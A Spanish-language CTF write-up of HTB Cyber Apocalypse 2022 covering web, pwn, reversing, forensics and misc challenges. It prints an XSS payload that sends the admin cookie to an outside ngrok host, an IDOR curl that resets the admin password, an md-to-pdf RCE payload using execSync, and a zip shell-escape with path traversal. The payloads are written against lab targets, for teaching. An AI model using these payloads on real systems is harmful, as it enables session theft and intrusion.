---
tags:
  - Stored XSS
  - IDOR
  - RCE (md-to-pdf)
  - Binary Analysis (IDA)
  - Microsoft Windows Event Logs Analysis (evtx)+
  - NTUSER.dat Analysis
  - GTFOBins (zip)
---

# HTB Cyber Apocalypse CTF 2022 <!-- omit from toc -->

Cyber Apocalypse CTF 2022 - Intergalactic Chase

![Cover de CTF](images/cover.jpg)

## Índice <!-- omit from toc -->

- [Intro](#intro)
- [Retos](#retos)
  - [Web](#web)
    - [Kryptos Support](#kryptos-support)
      - [Stats](#stats)
      - [Solución](#solución)
    - [BlinkerFluids](#blinkerfluids)
      - [Stats](#stats-1)
      - [Solución](#solución-1)
  - [Pwn](#pwn)
    - [Space Pirate: Entrypoint](#space-pirate-entrypoint)
      - [Stats](#stats-2)
      - [Solución](#solución-2)
  - [Reversing](#reversing)
    - [WIDE](#wide)
      - [Stats](#stats-3)
      - [Solución](#solución-3)
  - [Forensics](#forensics)
    - [Puppeteer](#puppeteer)
      - [Stats](#stats-4)
      - [Solución](#solución-4)
    - [Golden Persistence](#golden-persistence)
      - [Stats](#stats-5)
      - [Solución](#solución-5)
        - [Script completo](#script-completo)
  - [Misc](#misc)
    - [Compressor](#compressor)
      - [Stats](#stats-6)
      - [Solución](#solución-6)
      - [Composición](#composición)


## Intro

El CTF de Cyber Apocalypse volvió este año, bajo una temática intergaláctica estando disponible del 14 al 20 de Mayo del 2022. Mediante [este enlace](https://www.hackthebox.com/events/cyber-apocalypse-2022) se puede obtener más información del evento.

Aquí se encuentran las soluciones de los retos que pude resolver durante mi participación.

*El write-up aquí presente fue generado por medio de [CTFScrapper](https://github.com/srrequiem/CTFScrapper) para la creación de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en [mi compendio de retos](https://github.com/srrequiem/CTF-Challenge-Compilation).*

## Retos

### Web

#### Kryptos Support

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system? |
| File | - |

##### Solución

Después de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizará los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.

Haciendo uso del payload:

```html
<img src="" onerror=fetch("https://a748-189-203-27-57.ngrok.io/"+document.cookie).then() />
```

![XSS Payload](images/web/kryptos_support/xss_1.png)

Con la intención de robar una cookie de sesión correspondiente a la del admin, como lo menciona el sitio.

![XSS Execution](images/web/kryptos_support/xss_2.png)

De acuerdo a como está construida la cookie, se identificó que se trata de un JWT.

![JWT](images/web/kryptos_support/jwt.png)

Al buscar más información siendo que con la cookie de sesión no revela ningún cambio al utilizarla se identificó en el código fuente de `http://<challenge url>/login` se revela un directorio disponible haciendo uso de la cookie obtenida.

![Login source code](images/web/kryptos_support/login_1.png)

`login.js`

![Feature discover](images/web/kryptos_support/login_2.png)

Vista de `http://<challenge url>/tickets` haciendo uso de la cookie obtenida.

![Tickets url](images/web/kryptos_support/tickets.png)

Vista de `http://<challenge url>/settings` haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contraseña del "usuario logueado".

![Settings url](images/web/kryptos_support/settings_1.png)

![Settings source code](images/web/kryptos_support/settings_2.png)

Al visualizar el código se puede identificar que el parámetro `uid` es enviado al hacer uso de la funcionalidad.

![Settings js code](images/web/kryptos_support/settings_3.png)

Buscando invocar la funcionalidad haciendo uso de `curl` se envió el uid del moderador como prueba.

```bash
curl -v http://13868188223:30914/api/users/update -X POST -H "Content-Type: application/json" -d '{"password":"123456","uid":100}' --cookie "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA"
```

![Respuesta de cambio con moderador](images/web/kryptos_support/password_1.png)

Habiéndo mencionado que se envía el `uid` en la petición, se decidió cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.

![Respuesta de cambio con uid 1](images/web/kryptos_support/password_2.png)

Al haber sido satisfactorio el cambio de contraseña se puede realizar el login como admin, obteniendo de esta manera la bandera.

![Login como admin](images/web/kryptos_support/admin.png)

>Flag: HTB{x55_4nd_id0rs_ar3_fun!!}

#### BlinkerFluids

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him? |
| File | [web_blinkerfluids.zip](https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/web_blinkerfluids.zip) |

##### Solución

Después de identificar la composición del código se encontró que:

- La bandera se encontraba en `/flag.txt`.
- [Una librería empleada es vulnerable a RCE (md-to-pdf)](https://githubcom/simonhaenisch/md-to-pdf/issues/99).
- Por la configuación de la aplicación, sólo se permitía la obtención de archivos en el directorio `/static/invoices/`.

Al capturar el contenido enviado se utilizó el siguiente payload como cuerpo del archivo markdown:

```
---js\n((require(\"child_process\"))execSync(\"cp /flag.txt /static/invoices/flag.txt\"))\n---RCE
```

![Request enviada](images/web/blinker_fluids/request.png)

Ejecutando así el payload y permitiendo navegar a donde se encuentra la bandera

![Bandera](images/web/blinker_fluids/flag.png)

>Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}

### Pwn

#### Space Pirate: Entrypoint

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | D12 is one of Golden Fang's missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.   |
| File | [pwn_sp_entrypoint.zip](https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/pwn_sp_entrypoint.zip) |

##### Solución

Con los archivos que disponibles se probó localmente el binario y a modo de prueba y error, se identificó que al hacer uso de la contraseña `1234` el binario lee los contenidos del archivo local `flag.txt`.

```bash
1 Scan card 💳
2 Insert password ↪️
> 2
[*] Insert password: 1234

[+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_4_t35t1ng}

[-] Invalid option! Intruder detected! 🚨 🚨
```

Por lo que de la misma manera se realizó el mismo proceso en la conexión remota disponible.

```bash
1 Scan card 💳
2 Insert password ↪️
> 2
[*] Insert password: 1234

[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
[-] Invalid option! Intruder detected! 🚨 🚨
```

>Flag: HTB{th3_g4t35_4r3_0p3n!}

### Reversing

#### WIDE

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | We've received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You've managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control? |
| File | [rev_wide.zip](https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/rev_wide.zip) |

##### Solución

Después de interactuar con el binario y ver las posibilidades ofrecidas, la opción que se visualiza como cifrada pide una contraseña para visualizar su contenido.

![Uso inicial](images/reversing/wide/initial.png)

Buscando el valor en duro mediante su ejecución en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contraseña.

![Flujo al cargar archivo](images/reversing/wide/ida.png)

Obteniendo el valor: `sup3rs3cr3tw1d3`.

Y al pasarse como contraseña, se obtuvo la bandera.

![Bandera](images/reversing/wide/flag.png)

>Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}

### Forensics

#### Puppeteer

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | Planet Longhir is known for it's top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation's communication satellites. The mystery that Miyuki is trying to solve is, how the satellite's location was leaked since it is a top-sercret that only Galactic Federation's council is aware of. Help her analyse the Council's HQ event logs and solve this mystery. |
| File | [forensics_puppeteer.zip](https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/forensics_puppeteer.zip) |

##### Solución

Se uso como base la solución de un [reto similar que anteriormente HackTheBox había publicado](https://josh-vr.medium.com/hackthebox-event-horizon-forensics-challenge-writeup-b32839a3307d), que fue encontrado al buscar como realizar análisis a los tipos de archivos dados.

Al revisar el mismo archivo indicado en el writeup (`Microsoft-Windows-PowerShell%4Operationalevtx`), que por suerte, también existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripción del reto (contexto del evento).

![Coincidencias respecto al reto](images/forensics/puppeteer/coincidencias.png)

En uno de ellos se encuentra algo que por su composición se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el código concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con `0xd1`

![Stages de códigos](images/forensics/puppeteer/stages.png)

1. Declaración de stages
2. Concatenación
3. XOR a cada elemento

Se imprimió esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de [esta receta de CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Line%20feed',false)&input=NzIKODQKNjYKMTIzCjk4CjUxCjExOQoxMDQKNTIKMTE0CjUxCjk1CjQ4CjEwMgo5NQoxMTYKMTA0CjUxCjk1Cjk4CjQ4CjQ4CjExNgo1Mwo5NQo0OAoxMDIKOTUKMTA2CjExNwoxMTUKMTE2CjQ5Cjk5CjUxCjQ2CjQ2CjQ2CjEyNQ).

Modificación a script original:

![Modificación a script](images/forensics/puppeteer/modificacion.png)

Ejecución:

![Ejecución de script](images/forensics/puppeteer/ejecucion.png)

Decodeo de valores obtenidos para obtener bandera:

![Obtención de bandera](images/forensics/puppeteer/flag.png)

>Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}

#### Golden Persistence

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir's space station and escalate their privileges, they will soon be able to activate the station's defence mechanisms that are able to prevent any spaceship from entering Urkir's airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again. |
| File | [forensics_golden_persistence.zip](https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/forensics_golden_persistence.zip) |

##### Solución

Después de investigar acerca del análisis del archivo dado (`NTUSER.dat`), se encontró este [write-up](https://www.youtube.com/watch?v=VmKvYRyTixw) en el que se hace uso de diferentes herramientas para análizar y navegar entre los registros del archivo, del cuál en el registro `/Software/Microsoft/Windows/CurrentVersion/Run` se identificó el uso de powershell con un parámetro poco convencional. Haciendo uso de `reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT`.

![Registro poco convencional](images/forensics/golden_persistence/reglookup_1.png)

Después de identificar que el parámetro se encontraba codificado en base64 y desencodeándolo, se puede visualizar el script utilizado.

![Decodeo de base64](images/forensics/golden_persistence/decodeo.png)

De acuerdo al código, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.

![Obtención de valor de registros](images/forensics/golden_persistence/registros.png)

Extrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.

![Valores cifrados](images/forensics/golden_persistence/valores_cifrados.png)

Al ejecutar la reconstrucción del script, aún presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecución correcta quedó de la [siguiente manera](#script-completo)

![Ejemplo de inconsistencias](images/forensics/golden_persistence/inconsistencias.png)

###### Script completo

```powershell linenums="1"
function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )

    [Byte[]]$buffer = New-Object Byte[] $data.Length
    $data.CopyTo($buffer, 0)

    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;

    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }

    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }

    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }

    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0,
        Mandatory=$true,
        ValueFromPipeline=$true)
    ]
    [string]$s)
    $return = @()

    for ($i = 0; $i -lt $s.Length ; $i += 2)
    {
        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
    }

    Write-Output $return
}

$enc = [System.Text.Encoding]::ASCII
[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
#$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL
#$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW
#$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
#$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl
#$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C
$encrypted1 = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
$encrypted2 = "CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
$encrypted3 = "C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
$encrypted4 = "D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
$encrypted5 = "84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString
#$DecryptedString|iex
```

Del cuál al ejecutarse se obtiene el valor original del parámetro ejecutado, encontrando de esta manera la bandera.

![Payload ejecutado](images/forensics/golden_persistence/payload.png)

>Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}

### Misc

#### Compressor

##### Stats

| Attribute | Info |
|---|---|
| Difficulty | easy |
| Description | Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it? |
| File | - |

##### Solución

Para este reto se exponía una conexión a un host en donde se ofrecían diferentes opciones para interactuar con el binario disponible.

De acuerdo a la interacción se encontraron 2 formas de resolver el reto, mediante un **Path traversal** haciendo uso de la ejecución de `cat` disponible.

```bash
└─$ nc 138.68.183.64 31076

[*] Directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../flag.txt
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}
```

Y también por medio de la utilidad expuesta de `zip` se encuentra un [GTFOBin](https://gtfobins.github.io/gtfobins/zip/#shell) el cuál permite la invocación de una shell.

```bash
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 4


Insert <name>.zip:
Insert <name>: /etc/passwd
Insert <options>: -T -TT 'sh #'
  adding: etc/passwd (deflated 62%)
ls -la
total 12
drwxr-sr-x    2 ctf      ctf           4096 May 18 23:01 .
drwxr-sr-x    6 ctf      ctf           4096 May 18 23:00 ..
-rw-------    1 ctf      ctf            650 May 18 23:01 zikfJpfK
cd ..
ls -la
total 24
drwxr-sr-x    6 ctf      ctf           4096 May 18 23:00 .
drwxr-sr-x    1 ctf      ctf           4096 May 18 23:00 ..
drwxr-sr-x    2 ctf      ctf           4096 May 18 23:00 Hands
drwxr-sr-x    2 ctf      ctf           4096 May 18 23:01 Head
drwxr-sr-x    2 ctf      ctf           4096 May 18 23:00 Legs
drwxr-sr-x    2 ctf      ctf           4096 May 18 23:00 Torso
cd ..
ls -la
total 44
drwxr-sr-x    1 ctf      ctf           4096 May 18 23:00 .
drwxr-xr-x    1 root     root          4096 Mar  3 15:18 ..
drwxr-sr-x    6 ctf      ctf           4096 May 18 22:57 5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21
-rwxrwxr-x    1 root     root          3166 May 12 23:51 artifacts.py
-rw-rw-r--    1 root     root           263 May 12 23:32 clear.py
-rw-rw-r--    1 root     root            38 May 12 17:37 flag.txt
drwxr-sr-x    6 ctf      ctf           4096 May 18 22:55 kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl
drwxr-sr-x    6 ctf      ctf           4096 May 18 22:54 kWHPODHQFKSletaDKHB2AgJslbm6fwbb
drwxr-sr-x    6 ctf      ctf           4096 May 18 23:00 tHV1tdX82QcPllglF8wa6AhU24FRZS4S
drwxr-sr-x    6 ctf      ctf           4096 May 18 22:55 wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI
```

>FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}

##### Composición

Como parte del ejercicio "post-reto" se extrajo el código correspondiente al reto (`artifacts.py` y clear.py).

```python title="artifacts.py" linenums="1"
#!/usr/bin/python3
import os, random
from termcolor import colored


whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.'#/ "
PATH = "./"
sub_array = ["Head", "Torso", "Hands", "Legs"]

# Create random directory
def rand_dirname(length=32):
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    dirname = ""
    while len(dirname) < length:
        dirname += random.choice(charset)
    return dirname

def check_filename(filename):
    return all(i in whitelist for i in filename)

def change_sub_dir(idx, color):
  print(colored(f"\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\n", color))
  os.chdir(PATH + sub_array[idx])

def subjects():
  subs = """\nComponent List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+
  """
  print(colored(subs, "magenta"))
  ans = int(input(colored("[*] Choose component: ", "magenta")))

  if ans == 1:
    change_sub_dir(0, "blue")
  elif ans == 2:
    change_sub_dir(1, "green")
  elif ans == 3:
    change_sub_dir(2, "cyan")
  elif ans == 4:
    change_sub_dir(3, "yellow")
  else:
    print(colored("\n[-] Invalid option!\n", "red"))
    exit()

def menu():
  m = """
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit
  """
  print(colored(m, "yellow"))
  return int(input(colored("[*] Choose action: ", "yellow")))

def create_file():
  fname = input(colored("Insert name: ", "yellow")).strip()
  if not check_filename(fname):
    print(colored("\n[-] Invalid name!\n", "red"))
    exit()
  os.system(f"touch {fname}")
  contents = input(colored("\nInsert content: ", "yellow"))
  f = open(fname, "a")
  f.write(contents)
  f.close()
  print("\n")
  print(colored(f"[+] Artifact [{fname}] was created successfuly!", "green"))

def zip():
  zip_name = input(colored("Insert <name>.zip: ", "blue")).strip()
  files    = input(colored("Insert <name>: ", "blue")).strip()
  options  = input(colored("Insert <options>: ", "blue")).strip()
  if not check_filename(zip_name) or not check_filename(files) or not check_filename(options):
    print(colored("\n[-] Invalid name!\n", "red"))
    exit()
  os.system(f"zip {zip_name}.zip {files} {options}")

# Create directory
dirname = rand_dirname()
print(colored(f"\n[*] Directory to work in: {dirname}", "cyan"))
os.mkdir(PATH + dirname)
os.chdir(PATH + dirname)
os.system("mkdir -p Head Torso Hands Legs")

ans = subjects()

while True:

  # Choose action
  act = menu()
  print("\n")
  if act == 1: 
    create_file()
  elif act == 4:
    zip()
  elif act == 3: 
    fname = input("Insert name you want to read: ").strip()
    os.system(f"cat ./{fname}")
  elif act == 2: 
    os.system("pwd; ls -la")
  elif act == 6:
    os.system("rm -rf ./*")
  elif act == 5: 
    os.chdir(f"../../{dirname}")
    ans = subjects()
  else:
    print(colored("\n[-] Invalid option!\n", "red"))
    os.system("rm -rf ./*")
    exit()
```

```python title="clear.py" linenums="1"
import os

os.system('ls -la > temp')

f = open('temp', 'r')
for line in f:
  arr = line.split()
  try:
    if len(arr[8]) > 16:
      os.system(f'rm -rf {arr[8]}') 
  except:
    print('')

print(f'[+] Directories have been deleted!\n')
os.system('rm -f ./temp')
```
